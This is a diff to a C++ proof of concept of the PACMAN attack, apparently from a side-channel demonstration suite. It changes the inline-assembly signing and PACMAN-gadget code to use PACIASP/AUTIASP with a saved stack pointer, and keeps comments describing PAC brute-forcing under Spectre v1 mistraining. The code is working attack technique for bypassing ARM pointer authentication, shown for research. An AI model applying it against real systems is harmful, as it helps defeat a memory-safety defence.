@@ -15,11 +15,11 @@
 // the correct guess.
 //
 // Attack flow:
-//   1. Sign a pointer to secret data with PACIA (PAC stored in upper bits)
+//   1. Sign a pointer to secret data with PACIASP (PAC stored in upper bits)
 //   2. For each PAC guess (0..127):
 //      a. Insert guessed PAC into the pointer
 //      b. Use Spectre v1 PHT mistraining to create speculation window
-//      c. Inside mispredicted branch: AUTIA + dereference + oracle access
+//      c. Inside mispredicted branch: AUTIASP + dereference + oracle access
 //      d. If PAC correct: dereference succeeds, oracle touched (cache hit)
 //      e. If PAC wrong: dereference faults, oracle not touched (no cache hit)
 //   3. Cache side channel reveals which PAC guess was correct
@@ -42,14 +42,23 @@
 #include "local_content.h"
 #include "utils.h"
 
-// Sign pointer with PACIA (key A, context 0).
+// SP value captured at signing time. Must be restored before AUTIASP
+// because PACIASP/AUTIASP use SP as the modifier.
+static uint64_t g_sign_sp = 0;
+
+// Sign pointer with PACIASP (key A, SP as modifier).
+// PACIASP operates on X30 with SP as modifier, so we move the pointer
+// into X30, sign it, and move the result back.
 static uint64_t SignPointer(const void *ptr) {
-    uint64_t result = reinterpret_cast<uint64_t>(ptr);
-    uint64_t context = 0;
+    uint64_t result;
     asm volatile(
-        "pacia %0, %1"
-        : "+r"(result)
-        : "r"(context));
+        "mov %1, sp\n"
+        "mov x30, %2\n"
+        "paciasp\n"
+        "mov %0, x30\n"
+        : "=r"(result), "=r"(g_sign_sp)
+        : "r"(reinterpret_cast<uint64_t>(ptr))
+        : "x30");
     return result;
 }
 
@@ -65,16 +74,22 @@ static uint64_t InsertPAC(uint64_t raw_ptr, uint64_t guessed_pac) {
 
 // PACMAN gadget: authenticate + dereference + oracle access.
 // Placed inside a mispredicted branch so wrong-PAC faults are squashed.
+// AUTIASP operates on X30 with SP as modifier, so we restore the SP
+// captured at signing time before authenticating.
 static void PacmanGadget(uint64_t signed_ptr, const void *oracle_base) {
-    uint64_t context = 0;
     asm volatile(
-        "autia %[ptr], %[ctx]\n"
-        "ldrb w3, [%[ptr]]\n"
+        "mov x4, sp\n"
+        "mov sp, %[sign_sp]\n"
+        "mov x30, %[ptr]\n"
+        "autiasp\n"
+        "mov sp, x4\n"
+        "ldrb w3, [x30]\n"
         "add x3, %[oracle], x3, lsl 12\n"
         "ldrb w3, [x3]\n"
         :
-        : [ptr] "r"(signed_ptr), [oracle] "r"(oracle_base), [ctx] "r"(context)
-        : "x3", "memory");
+        : [ptr] "r"(signed_ptr), [oracle] "r"(oracle_base),
+          [sign_sp] "r"(g_sign_sp)
+        : "x3", "x4", "x30", "memory");
 }
 
 // Try one PAC guess using Spectre v1 PHT mistraining.
